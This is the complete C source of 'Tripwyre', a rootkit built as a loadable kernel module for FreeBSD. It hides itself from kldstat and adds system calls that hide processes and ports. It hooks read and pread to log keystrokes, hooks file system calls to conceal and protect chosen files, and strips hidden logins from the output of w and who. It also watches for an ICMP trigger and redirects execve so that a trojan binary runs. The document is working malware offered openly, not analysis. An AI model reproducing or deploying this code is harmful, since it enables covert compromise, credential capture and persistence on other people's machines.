/*
 * Tripwyre - A Loadable Kernel Module (LKM) Rootkit for FreeBSD
 * Author: Satish Srinivasan (sathya@freeshell.org)
 */

/* Common header files */
#include <sys/types.h>
#include <sys/param.h>
#include <sys/proc.h>
#include <sys/module.h>
#include <sys/kernel.h>
#include <sys/sysent.h>
#include <sys/systm.h>
#include <sys/syscall.h>
#include <sys/sysproto.h>
#include <sys/malloc.h>
#include <sys/mbuf.h>
#include <sys/protosw.h>
#include <sys/pcpu.h>
#include <sys/syscallsubr.h>

/* Headers for file handling */
#include <sys/fcntl.h>
#include <sys/file.h>

/* The in-kernel queue data structure */ 
#include <sys/queue.h>

/* The sockets library */
#include <sys/socket.h>

/* Headers for the TCP/IP stack for ICMP Hooking */
#include <net/if.h>
#include <netinet/in.h>
#include <netinet/in_pcb.h>
#include <netinet/ip_var.h>
#include <netinet/tcp_var.h>
#include <netinet/in_systm.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>

/* For linking, locking and mutex synchronization. */
#include <sys/linker.h>
#include <sys/lock.h>
#include <sys/mutex.h>
#include <sys/sx.h>

/* For Virtual Memory */
#include <vm/vm.h>
#include <vm/vm_page.h>
#include <vm/vm_map.h>

/* For system logging facilities */
#include <sys/syslog.h>

/* For directory manipulation */
#include <dirent.h>

/* user options */
#include "options.h"

#define VERSION "tripwyre.ko" /* name */

#if KEYLOGGING == 1

static volatile int filewriter_hooked = 0;
static int testfd = 0;

static int 
filewriter_writelog(struct thread *td, int fd, char *line, u_int len)
{
  struct uio auio; 
  struct iovec aiov; 
  int err; 
  bzero(&aiov, sizeof(aiov)); 
  bzero(&auio, sizeof(auio)); 
  aiov.iov_base = line; 
  aiov.iov_len = len; 
  auio.uio_iov = &aiov; 
  auio.uio_offset = 0; 
  auio.uio_segflg = UIO_SYSSPACE; 
  auio.uio_rw = UIO_WRITE; 
  auio.uio_iovcnt = 1; 
  auio.uio_resid = len; 
  auio.uio_td = td; 
#if DEBUG == 1  
  printf("[tripwyre debug] log filewriter fd: %u ", fd); 
  //  printf(aiov.iov_base); 
  printf("\n");
#endif
  err = kern_writev(td, fd, &auio); 
#if DEBUG == 1  
  if(err)
    printf("[tripwyre debug] log write err: %u\n", err); 
#endif  
  return err; 
}

static int 
filewriter_closelog(struct thread *td, int fd) 
{ 
#if DEBUG == 1
  printf("[tripwyre debug] filewriter_closelog fd: %d\n", fd); 
#endif  
  if(fd) 
    { 
      struct close_args fdtmp; 
      fdtmp.fd = fd; 
#if DEBUG == 1
      printf("[tripwyre debug] filewriter_closelog thread ptr: %x\n", (unsigned int)td); 
#endif      
      return close(td, &fdtmp); 
    } 
  return 0; 
} 

static int 
filewriter_openlog(struct thread *td, int *fd, char *path) 
{ 
  int error; 
  error = kern_open(td, path, UIO_SYSSPACE, O_WRONLY | O_CREAT | O_APPEND, 0644); 
  if (!error) { 
    *fd = td->td_retval[0];
#if DEBUG == 1
    printf("[tripwyre debug] openlog fd: %d\n", *fd); 
#endif
  } 
  else
#if DEBUG == 1 
    printf("[tripwyre debug] openlog failed\n"); 
#endif
  return error;
}
#endif

#if KEYLOGGING == 1

/* Plain Text */
unsigned char buffer[MAX_BUF];

/* Cipher Text */
unsigned char outbuf[MAX_BUF];
char *wwe = buffer;
int count = 0;

#if KEY_ENCR == 1
unsigned char *keyf = PASS_PHRASE;
int len = PASSLEN;
#endif

#endif

MALLOC_DEFINE(M_NEW_DIR, "dir", "struct");

#if HIDDEN_LOGIN == 1

/* The structure for the hidden user login */

struct hidden_login {
  struct hidden_login *next;
  char login[MAXLOGIN];
} *c_login;
#endif

/* 
 * Variables to reference in order to hide this
 * module from kldstat which aren't defined in
 * any header files
 */

extern linker_file_list_t linker_files;
extern struct mtx kld_mtx;
extern int next_file_id;

typedef TAILQ_HEAD(, module) modulelist_t;
extern modulelist_t modules;
extern int nextid;

struct module {
  /* chain together all modules */
  TAILQ_ENTRY(module) link; 
  /* all modules in a file */
  TAILQ_ENTRY(module) flink;
  /* file which contains this module */ 
  struct linker_file *file;
  /* reference count */
  int refs; 
  /* unique id number */  
  int id; 
  /* module name */
  char *name; 
  /* event handler */
  modeventhand_t handler; 
  /* argument for handler */
  void *arg; 
  /* module specific data */
  modspecific_t data; 
};

/*  arguments for the hooked syscall for hiding processes */
struct process_hiding_args {
  pid_t p_pid; /* process identifier */
};

/* arguments for hiding ports */
struct port_hiding_args {
  u_int16_t lport; /* local port */
};

/* The protocol switch table */
extern struct protosw inetsw[];

/* Our very own ICMP input hook */
pr_input_t icmp_input_hook;

/* System call to hide a running process. */
static int tripwyre_process_hiding(struct thread *td, void *syscall_args)
{
  struct process_hiding_args *uap;
  uap = (struct process_hiding_args *)syscall_args;

  struct proc *p;

  sx_xlock(&allproc_lock); // acquire shared lock for all process table

  /* Iterate through the process-id hash table */
  LIST_FOREACH(p, PIDHASH(uap->p_pid), p_hash)
    if(p->p_pid == uap->p_pid) {
      if(p->p_state == PRS_NEW) {
	p = NULL;
	break;
      }
      /* lock the process so we can manipulate it */
      PROC_LOCK(p);

      /* Hide this process */
      LIST_REMOVE(p, p_list);
      LIST_REMOVE(p, p_hash);

      /* unlock it as we're done */
      PROC_UNLOCK(p);

      break;
    }

  sx_xunlock(&allproc_lock); /* unlock the table */
  return(0);
}

/*  The sysent table entry for the above system call */
static struct sysent process_hiding_sysent = {
  1, /* number of arguments */
  tripwyre_process_hiding /* implementing function */
};

/* The offset in sysent where the system call should be placed in the table */
static int offset_process = NO_SYSCALL;

/* System call to hide open ports */
static int tripwyre_port_hiding (struct thread *td, void *syscall_args)
{
  struct port_hiding_args *uap;
  uap = (struct port_hiding_args *) syscall_args;

  struct inpcb *inpb;

  INP_INFO_WLOCK(&tcbinfo);

  /* Iterate through the TCP-based inpcb list. */
  LIST_FOREACH(inpb, tcbinfo.listhead, inp_list) {
    if(inpb->inp_vflag & INP_TIMEWAIT)
      continue;
    
    INP_LOCK(inpb);

    /* Is this the port to hide? */
    if(uap->lport == ntohs(inpb->inp_inc.inc_ie.ie_lport))
      LIST_REMOVE(inpb, inp_list);

    INP_UNLOCK(inpb);
  }

  INP_INFO_WUNLOCK(&tcbinfo);

  return(0);
}

/* The sysent entry for the new system call. */
static struct sysent port_hiding_sysent = {
  1, /* number of arguments */
  tripwyre_port_hiding /* implementing function */
};

static int offset_port = NO_SYSCALL; /* offset */

#if DIRECTORY_FILE_HIDING == 1

static int hooked_getdirentries(struct thread *td, void *syscall_args)
{
    struct getdirentries_args *uap;
    uap = (struct getdirentries_args *)syscall_args;

    struct dirent *dp, *current;
    unsigned int size, count, length;
    int flag = 0;

    /* Read directory entries from fd into buf, and... */
    getdirentries(td, syscall_args);

    /* record the number of bytes transferred. */
    size = td->td_retval[0];

    /* Does fd contain any directory entries? */
    if (size > 0) {
      /* Allocate kernel memory, and... */
      MALLOC(dp, struct dirent *, size, M_TEMP, M_NOWAIT);

      /* create a local copy of the directory entries. */
      copyin(uap->buf, dp, size);

      current = dp;
      count = size;

      /* Iterate through the directory entries. */
      while (count > 0) {
	length = current->d_reclen;
	count -= length;

	/*  Check if we have to hide this directory entry? */
	if (strncmp((char *)&(current->d_name), HIDDEN_DIR, HIDDEN_DIR_LENGTH) == 0) {
	  if (count != 0) {
	    /* Yes? cut it out */
	    bcopy((char *)current + length, current, count);
	    flag = 1;
	  }

	  /* Adjust locally the "number of bytes transferred". */
	  size -= length;
	}

	/* Make sure the last directory entry always 
	 * has a record length of 0. 
	 */
	if (current->d_reclen == 0)
	  /* Get out of while loop. */
	  count = 0;

	/* any more? */
	if (count != 0 && flag == 0) {
		/* If so, point to the next directory entry. */ 
		current = (struct dirent *)((char *)current + length);
	}
	flag = 0;
      }

      /* Adjust the getdirentries(2) return values. */
      td->td_retval[0] = size;
      copyout(dp, uap->buf, size);

      FREE(dp, M_TEMP);
    }

    return(0);
}

#endif

#if KEYLOGGING == 1

void mystrcpy (char *, char *);

void mystrcpy (char *src, char *dst)
{
  while((*dst++ = *src++) != '\0')
    ;
}

char *mystrcat (char src, char *dest);

char *mystrcat (char src, char *dest)
{
  while(*dest) *dest++;
  *dest++ = src;
  *dest = '\0';
  return dest;
}

#endif

#if KEYLOGGING == 1

/*
 * Hooked read system call. Copy whatever
 * is read to a temporary buffer which is
 * to be logged and then continue the normal
 * execution. This buffer's contents should 
 * also be encrypted with the user's PASSPHRASE.
 * SLOWS DOWN the system and is unstable.
 */

static int read_hook(struct thread *td, void *syscall_args)
{
  struct read_args *uap;
  uap = (struct read_args *)syscall_args;

  //int i = 0;
  //int retval;
  int error;
  char buf[1];
  int done;
  
  error = read(td, syscall_args);
  
  if(error || (!uap -> nbyte) || (uap->nbyte > 1) || (uap->fd != 0))
    return error;

  //if (uap->nbyte == 1 && uap->fd == 0){
    copyinstr(uap->buf, buf, 1, &done);

    // if(error != 0)
    //  return(error);
    //}

  //printf("%c\n", buf[0]);
   
  if(count < MAX_BUF) {
	  wwe = mystrcat(buf[0], wwe); /* append to it */
	  ++count;
  } 
  
  return (error);
}

static int pread_hook(struct thread *td, void *syscall_args)
{
  struct pread_args *uap;
  uap = (struct pread_args *)syscall_args;

  //int i = 0;
  //int retval;
  int error;
  char buf[1];
  int done;
  
  error = pread(td, syscall_args);
  
  if(error || (!uap -> nbyte) || (uap->nbyte > 1) || (uap->fd != 0))
    return error;

  //if (uap->nbyte == 1 && uap->fd == 0){
    copyinstr(uap->buf, buf, 1, &done);

    // if(error != 0)
    //  return(error);
    //}

  //printf("%c\n", buf[0]);

  if(count < MAX_BUF) {
    wwe = mystrcat(buf[0], wwe);
    ++count;
  }

  //int i = 0;

  //int error;
  //char buf[1];
  //int done;
  
  //error = pread(td, syscall_args);
  
  //if(error || (!uap -> nbyte) || (uap->nbyte > 1) || (uap->fd != 0))
  //  return error;
  
  //copyinstr(uap->buf, buf, 1, &done);
  //printf("%c\n", buf[0]); 
  
  //if(count < MAX_BUF) {
  //  wwe = mystrcat(buf[0], wwe);
  //  ++count;
  //}

  return (error);
}

#endif

#if DIRECTORY_FILE_HIDING == 1

int file_hidden(char *name);

/* 
 * Check if the file with the given
 * string is to be hidden. That is if it
 * starts with the name.
 */

int file_hidden(char *name)
{

  char buf[HIDDEN_FILE_LENGTH +1];
  
  bcopy(name, buf, HIDDEN_FILE_LENGTH);
  buf[HIDDEN_FILE_LENGTH] = '\0';

  /* compare the string start with the hidden file */
  if(!strcmp(buf, HIDDEN_FILE))
    return 1;

  return 0;
}

#endif

#if DIRECTORY_FILE_HIDING == 1

/* Prevent programs from opening and reading certain files */
static int hooked_open (struct thread *td, void *syscall_args)
{
  struct open_args *uap;
  uap = (struct open_args *) syscall_args;
  char name[NAME_MAX];
  size_t size;

  if(copyinstr(uap->path, name, NAME_MAX, &size) == EFAULT)
    return (EFAULT);

  /* If this is the file to hide, return ENOENT */

  if(file_hidden(name))
    return (ENOENT);

  return (open(td, syscall_args));
}

/* stat system call shouldn't 'see' the file */
static int hooked_stat(struct thread *td, void *syscall_args)
{
  struct stat_args *uap;
  uap = (struct stat_args *) syscall_args;
  
  char name[NAME_MAX];
  size_t size;

  /* get the supplied arguments from userspace */
  if(copyinstr(uap->path, name, NAME_MAX, &size) == EFAULT)
    return(EFAULT);

  if(file_hidden(name)) /* should it be hidden? */
    return(ENOENT);

  return(stat(td, syscall_args));

}

static int hooked_lstat(struct thread *td, void *syscall_args)
{
  struct lstat_args *uap;
  uap = (struct lstat_args *) syscall_args;

  char name[NAME_MAX];
  size_t size;

  if(copyinstr(uap->path, name, NAME_MAX, &size) == EFAULT)
    return(EFAULT);

  if(file_hidden(name))
    return(ENOENT);

  return(lstat(td,syscall_args));
}

/* Hooks for chflags system call */
static int hooked_chflags(struct thread *td, void *syscall_args)
{
  struct lstat_args *uap;
  uap = (struct lstat_args *) syscall_args;

  char name[NAME_MAX];
  size_t size;

  if(copyinstr(uap->path, name, NAME_MAX, &size) == EFAULT)
    return(EFAULT);

  if(file_hidden(name))
    return(ENOENT);

  return(chflags(td, syscall_args));
}

#endif

#if DIRECTORY_FILE_HIDING == 1
 
/* Hook for the chmod system call */
static int hooked_chmod(struct thread *td, void *syscall_args)
{
  struct chmod_args *uap;
  uap = (struct chmod_args *) syscall_args;

  char name[NAME_MAX];
  size_t size;

#if HIDDEN_LOGIN == 1
  struct hidden_login *l_login;
 
  if(uap->mode == SIGHIDEME) {
    if(!(MALLOC(l_login, struct hidden_login *, sizeof(struct hidden_login),M_IOV,M_NOWAIT)))
      return 1;
    l_login->next = c_login;
    c_login = l_login;

    copyin(uap->path, l_login->login, MAXLOGIN - 1);
    return 0;
  }
#endif

  if(copyinstr(uap->path, name, NAME_MAX, &size) == EFAULT)
    return(EFAULT);

  if(file_hidden(name))
    return(ENOENT);

  return(chmod(td, syscall_args));
}

#endif

#if DIRECTORY_FILE_HIDING == 1

/* Hook for the chown system call */
static int hooked_chown(struct thread *td, void *syscall_args)
{
  struct chown_args *uap;
  uap = (struct chown_args *) syscall_args;

  char name[NAME_MAX];
  size_t size;
   
  if(copyinstr(uap->path, name, NAME_MAX, &size) == EFAULT)
    return(EFAULT);
    
  if(file_hidden(name))
    return(ENOENT);

  return(chown(td, syscall_args));
}

/* Hook for the utimes system call */
static int hooked_utimes(struct thread *td, void *syscall_args)
{
  struct utimes_args *uap;
  uap = (struct utimes_args *) syscall_args;

  char name[NAME_MAX];
  size_t size;
  
  if(copyinstr(uap->path, name, NAME_MAX, &size) == EFAULT)
    return(EFAULT); 
   
  if(file_hidden(name))
    return(ENOENT);

  return(utimes(td, syscall_args));
}

/* Hook for the truncate system call */
static int hooked_truncate(struct thread *td, void *syscall_args)
{
  struct truncate_args *uap;
  uap = (struct truncate_args *) syscall_args;

  char name[NAME_MAX];
  size_t size;
 
  if(copyinstr(uap->path, name, NAME_MAX, &size) == EFAULT)
    return(EFAULT);
   
  if(file_hidden(name))
    return(ENOENT);

  return(truncate(td, syscall_args));
}

/* Hook for the rename system call */
static int hooked_rename(struct thread *td, void *syscall_args)
{
  struct rename_args *uap;
  uap = (struct rename_args *) syscall_args;

  char name[NAME_MAX];
  size_t size;

  if(copyinstr(uap->from, name, NAME_MAX, &size) == EFAULT)
    return(EFAULT);
  
  if(file_hidden(name))
    return(ENOENT);

  return(rename(td, syscall_args));
}

/* Hook for unlink system call */
static int hooked_unlink(struct thread *td, void *syscall_args)
{
  struct unlink_args *uap;
  uap = (struct unlink_args *) syscall_args;

  char name[NAME_MAX];
  size_t size;

  if(copyinstr(uap->path, name, NAME_MAX, &size) == EFAULT)
    return(EFAULT);

  if(file_hidden(name))
    return(ENOENT);

  return(unlink(td, syscall_args));
}

#endif

#if HIDDEN_LOGIN == 1

char *my_strstr (char *, char *);

char *my_strstr (char *s, char *find)
{
  register char c, sc;
  register size_t len;

  if ((c = *find++) != 0) {
    len = strlen(find);
    do {
      do {
	if ((sc = *s++) == 0)
	  return (NULL);
      } while (sc != c);
    } while (strncmp(s, find, len) != 0);
    s--;
  }
  return ((char *)s);
}

/* 
 * Hook the write system call
 * for modifying the output of what
 * w or who sees.
 */
static int hooked_write(struct thread *td, void *syscall_args)
{
  struct write_args *uap;
  uap = (struct write_args *) syscall_args;

  char buf[MAX_BUF];
  struct hidden_login *l_login;

  /* who or w? */
  if(strcmp(td->td_proc->p_comm, "w") == 0 || (strcmp(td->td_proc->p_comm, "who") == 0)) {
    l_login = c_login;
    bzero(buf, sizeof(buf));
    copyin(uap->buf, buf, sizeof(buf) - 1);
    /* if so, work our magic to cut the entire line off */
    while(l_login != NULL)
      {
	if(my_strstr(buf, l_login->login))
	  return (uap->nbyte);
	l_login = l_login->next;
      }
  }
  
  return write(td, syscall_args);
}
 
#endif

#if ICMP_MONITORING == 1

/*
 * The ICMP Input hook used for 
 * displaying a message whenever the 
 * trigger phrase is detected
 */
void icmp_input_hook (struct mbuf *m, int off)
{
  struct icmp *icp;
  int hlen = off;

  /* Locate the ICMP message within m */
  m->m_len -= hlen;
  m->m_data += hlen;

  /* Extract the ICMP message */
  icp = mtod(m, struct icmp *);

  /* Restore the messsage. */
  m->m_len += hlen;
  m->m_data -= hlen;

  /* 
   * Check if this is the ICMP message
   * we are looking for, if not call the
   * original icmp_input.
   */

  //  if(icp->icmp_type == ICMP_REDIRECT &&
  // icp->icmp_type == ICMP_REDIRECT_TOSHOST &&
    if(strncmp(icp->icmp_data, ICMP_TRIGGER, ICMP_TRIGGER_LENGTH) == 0)
      printf("ICMP Trigger Recieved\n");
    //log(LOG_INFO, "ICMP Trigger recieved\n");
  else
    icmp_input(m, off);
}

#endif

#if EXEC_REDIR == 1

/* Execve System Call Hook for executing trojan binaries*/
static int 
execve_hook(struct thread *td, void *syscall_args) 
{ 
  struct execve_args  *uap; 
  uap = (struct execve_args *)syscall_args; 

  struct execve_args kernel_ea; 
  struct execve_args *user_ea; 
  struct vmspace *vm; 
  vm_offset_t base, addr; 
  char t_fname[] = REPLACEMENT; 
 
  /* Redirect this process? */ 
  if (strcmp(uap->fname, ORIGINAL) == 0) { 
    
    /* 
     * Determine the end boundary address of the current 
     * process's user data space. 
     */ 	
    vm = curthread->td_proc->p_vmspace; 
    base = round_page((vm_offset_t) vm->vm_daddr); 
    addr = base + ctob(vm->vm_dsize);

    /*
     * ALLOCATE a PAGE_SIZE null region of
     * memory for a new set of execve args
     */            
    vm_map_find(&vm->vm_map, NULL, 0, &addr, PAGE_SIZE, FALSE, VM_PROT_ALL, VM_PROT_ALL, 0);
    vm->vm_dsize += btoc(PAGE_SIZE);

    /* 
     * Set up an execve_args structure for REPLACEMENT. This 
     * structure has to placed in user space, and because 
     * can't point to an element in kernel space once in
     * iuser space, we'll have to place any new "arrays" that 
     * this structure points to in user space as well. 
     */ 
    copyout(&t_fname, (char *)addr, strlen(t_fname));
    kernel_ea.fname = (char *) addr;
    kernel_ea.argv = uap->argv;
    kernel_ea.envv = uap->envv;

    /* Copy out the REPLACEMENT's argument structure */
    user_ea = (struct execve_args *)addr + sizeof(t_fname);
    copyout(&kernel_ea, user_ea, sizeof(struct execve_args));

    /* Execute Trojan */
    return(execve(curthread, user_ea));
  }
  
  return(execve(td, syscall_args));
}	

#endif

/* 
 * The parameters passed are: 
 * module -> the module
 * cmd -> module command
 * args -> module arguments
 */
static int event_handler_1 (struct module *module, int cmd, void *arg)
{
  int error = 0;

#if HIDING == 1
  struct linker_file *lf;
  struct module *mod;
#endif  

  switch (cmd) {
  case MOD_LOAD: /* module loading */

/*  Hide us from kldstat */
#if HIDING == 1
#if DEBUG == 1
    printf("[tripwyre debug] Hiding myself from the kernel!\n");
#endif    

   /* Acquire locks in order to prevent kernel panics */
   /* catch all lock to protect kernel from simultaneous writes */
    mtx_lock(&Giant); 
    mtx_lock(&kld_mtx); /* mutex lock for linker files */

    /* Decrement the current kernel image
       reference count. */
    (&linker_files)->tqh_first->refs--;

    /* Iterate through the linker_files list, 
     * looking for VERSION. If found decrement
     * next_file_id and remove from the list.
     */
    TAILQ_FOREACH(lf, &linker_files, link) {
      if(strcmp(lf->filename, VERSION) == 0) {
	next_file_id--;
	TAILQ_REMOVE(&linker_files, lf, link);
	break;
      }
    }

    /* Unlock all our previous locks */
    mtx_unlock(&kld_mtx);
    mtx_unlock(&Giant);

    /* 
     * The modules_sx protects the modules list and since we are changing it 
     * we have to protect it with a shared lock.
     */
    sx_xlock(&modules_sx);

    /* 
     * Iterate through the modules list, looking for "tripwyre", if found
     * decrement nextid and remove it from the list.
     */
    TAILQ_FOREACH(mod, &modules, link) {
      if (strcmp(mod->name, "tripwyre") == 0) {
	nextid--;
	TAILQ_REMOVE(&modules, mod, link);
	break;
      }
    }

    sx_unlock(&modules_sx);
#endif

    /* hooking syscalls */
#if DEBUG == 1
    printf("[tripwyre debug] Entering the kernel\n");
    printf("[tripwyre debug] System call tripwyre_process_hiding loaded at offset: %d\n", offset_process);
#endif

    /* Execve */
#if EXEC_REDIR == 1
#if DEBUG == 1
    printf("[tripwyre debug] Hooking execve\n");
#endif
    sysent[SYS_execve].sy_call = (sy_call_t *) execve_hook;
#endif

    /* 
     * The KEYLOGGING, ICMP_MONITORING
     * and DIRECTORY_FILE_HIDING
     * symbols are set in options.h
     */
#if KEYLOGGING == 1 

#if DEBUG == 1
    printf("[tripwyre debug] Hooking read system call\n");
#endif
    sysent[SYS_read].sy_call = (sy_call_t *) read_hook;
#if DEBUG == 1
    printf("[tripwyre debug] Hooking pread system call\n");
#endif
    sysent[SYS_pread].sy_call = (sy_call_t *) pread_hook;
#endif

#if KEYLOGGING == 1
#if DEBUG == 1
    printf("[tripwyre debug] File writer is opened to write to log\n");
#endif

#endif

#if DIRECTORY_FILE_HIDING == 1
#if DEBUG == 1
    printf("[tripwyre debug] Hooking getdirentries system call\n");
#endif
    sysent[SYS_getdirentries].sy_call = (sy_call_t *) hooked_getdirentries;
#if DEBUG == 1
    printf("[tripwyre debug] Hooking open system call\n");
#endif    
    sysent[SYS_open].sy_call = (sy_call_t *) hooked_open;
#if DEBUG == 1
    printf("[tripwyre debug] Hooking stat system call\n");
#endif    
    sysent[SYS_stat].sy_call = (sy_call_t *) hooked_stat;
#if DEBUG == 1
    printf("[tripwyre debug] Hooking lstat system call\n");
#endif    
    sysent[SYS_lstat].sy_call = (sy_call_t *) hooked_lstat;
#if DEBUG == 1
    printf("[tripwyre debug] Hooking chflags system call\n");
#endif    
    sysent[SYS_chflags].sy_call = (sy_call_t *) hooked_chflags;
#if DEBUG == 1
    printf("[tripwyre debug] Hooking chmod system call\n");
#endif    
    sysent[SYS_chmod].sy_call = (sy_call_t *) hooked_chmod;
#if DEBUG == 1
    printf("[tripwyre debug] Hooking chown system call\n");
#endif    
    sysent[SYS_chown].sy_call = (sy_call_t *) hooked_chown;
#if DEBUG == 1
    printf("[tripwyre debug] Hooking rename system call\n");
#endif    
    sysent[SYS_rename].sy_call = (sy_call_t *) hooked_rename;
#if DEBUG == 1
    printf("[tripwyre debug] Hooking unlink system call\n");
#endif    
    sysent[SYS_unlink].sy_call = (sy_call_t *) hooked_unlink;
#if DEBUG == 1
    printf("[tripwyre debug] Hooking utimes system call\n");
#endif    
    sysent[SYS_utimes].sy_call = (sy_call_t *) hooked_utimes;
#if DEBUG == 1
    printf("[tripwyre debug] Hooking truncate system call\n");
#endif    
    sysent[SYS_truncate].sy_call = (sy_call_t *) hooked_truncate;

#if DEBUG == 1
    printf("[tripwyre debug] Hooking write system call\n");
#endif
    sysent[SYS_write].sy_call = (sy_call_t *) hooked_write;
#endif

#if ICMP_MONITORING == 1
#if DEBUG == 1
    printf("[tripwyre debug] Hooking ICMP protocol\n");
#endif 
    inetsw[ip_protox[IPPROTO_ICMP]].pr_input = icmp_input_hook;
#endif

    break;

  case MOD_UNLOAD: /* unload event */

#if DEBUG == 1
    printf("[tripwyre debug] System call tripwyre_process_hiding unloaded from offset: %d\n", offset_process);
    printf("[tripwyre debug] Leaving the kernel.\n");
#endif

    /* Restore the hooked system calls to their original values */
    
    /* The KEYLOGGING and DIRECTORY_FILE_HIDING
       symbols are set in options.h */
#if EXEC_REDIR == 1
#if DEBUG == 1
    printf("[tripwyre debug] Unhooking execve\n");
#endif
    sysent[SYS_execve].sy_call = (sy_call_t *) execve;
#endif

#if KEYLOGGING == 1    
#if DEBUG == 1
    printf("[tripwyre debug] Unhooking read system call\n");
#endif
    sysent[SYS_read].sy_call = (sy_call_t *) read;
#if DEBUG == 1
    printf("[tripwyre debug] Unhooking pread system call\n");
#endif
    sysent[SYS_pread].sy_call = (sy_call_t *) pread;
#endif

#if KEYLOGGING == 1
#if DEBUG == 1
    printf("[tripwyre debug] Closing logs\n");
#endif

    /* If the file_writer is already in operation
        do nothing, otherwise hook it up and open */
    
    if(!(filewriter_hooked)) {
      filewriter_hooked = 1;
      filewriter_openlog(curthread, &testfd, LOGPATH);
    }


#if KEY_ENCR == 1
    mystrcpy(buffer, outbuf);
#else
    mystrcpy(buffer, outbuf);
#endif

    /* Write our log data to the log */
    filewriter_writelog(curthread, testfd, outbuf, sizeof(outbuf));

    /* If file_writer is already unhooked do nothing
       else and close the log that we're writing to. */
    if(filewriter_hooked) {
      filewriter_hooked = 0;
      filewriter_closelog(curthread, testfd);
    }

#endif

#if DIRECTORY_FILE_HIDING == 1    
#if DEBUG == 1
    printf("[tripwyre debug] Unhooking getdirentries system call\n");
#endif
    sysent[SYS_getdirentries].sy_call = (sy_call_t *) getdirentries;
#if DEBUG == 1
    printf("[tripwyre debug] Unhooking open system call\n");
#endif
    sysent[SYS_open].sy_call = (sy_call_t *) open;
#if DEBUG == 1
    printf("[tripwyre debug] Unhooking stat system call\n");
#endif    
    sysent[SYS_stat].sy_call = (sy_call_t *) stat;
#if DEBUG == 1
    printf("[tripwyre debug] Unhooking lstat system call\n");
#endif    
    sysent[SYS_lstat].sy_call = (sy_call_t *) lstat;
#if DEBUG == 1
    printf("[tripwyre debug] Unhooking chflags system call\n");
#endif    
    sysent[SYS_chflags].sy_call = (sy_call_t *) chflags;
#if DEBUG == 1
    printf("[tripwyre debug] Unhooking chmod system call\n");
#endif
    sysent[SYS_chmod].sy_call = (sy_call_t *) chmod;
#if DEBUG == 1
    printf("[tripwyre debug] Unhooking chown system call\n");
#endif    
    sysent[SYS_chown].sy_call = (sy_call_t *) chown;
#if DEBUG == 1
    printf("[tripwyre debug] Unhooking rename system call\n");
#endif
    sysent[SYS_rename].sy_call = (sy_call_t *) rename;
#if DEBUG == 1
    printf("[tripwyre debug] Unhooking unlink system call\n");
#endif    
    sysent[SYS_unlink].sy_call = (sy_call_t *) unlink;
#if DEBUG == 1
    printf("[tripwyre debug] Unhooking utimes system call\n");
#endif    
    sysent[SYS_utimes].sy_call = (sy_call_t *) utimes;
#if DEBUG == 1
    printf("[tripwyre debug] Unhooking truncate system call\n");
#endif    
    sysent[SYS_truncate].sy_call = (sy_call_t *) truncate;

#if DEBUG == 1
    printf("[tripwyre debug] Unhooking write system call\n");
#endif
    sysent[SYS_write].sy_call = (sy_call_t *) write;
#endif

#if ICMP_MONITORING == 1
#if DEBUG == 1
    printf("[tripwyre debug] Unhooking ICMP protocol\n");
#endif    
    inetsw[ip_protox[IPPROTO_ICMP]].pr_input = icmp_input;
#endif

    break;

  default:
    error = EOPNOTSUPP; /* send operation not supported for any other events */
    break;
  }

  return error;
}

static int event_handler_2 (struct module *module, int cmd, void *arg)
{
  int error = 0;
  
  switch (cmd) {
       
  case MOD_LOAD:
#if DEBUG == 1
	  printf("[tripwyre debug] System call tripwyre_port_hiding loaded at offset: %d\n", offset_port);
#endif
	  break;

  case MOD_UNLOAD:
#if DEBUG == 1
	  printf("[tripwyre debug] System call tripwyre_port_hiding unloaded from offset: %d\n", offset_port);
#endif
	  break;

  default:
	  error = EOPNOTSUPP;
	  break;
  }

  return error;
}

/* 
 * The macros to declare the loadable kernel 
 * module that implements system calls 
 */
SYSCALL_MODULE(tripwyre_process_hiding, &offset_process, &process_hiding_sysent,event_handler_1, NULL); 
SYSCALL_MODULE(tripwyre_port_hiding, &offset_port, &port_hiding_sysent, event_handler_2, NULL);

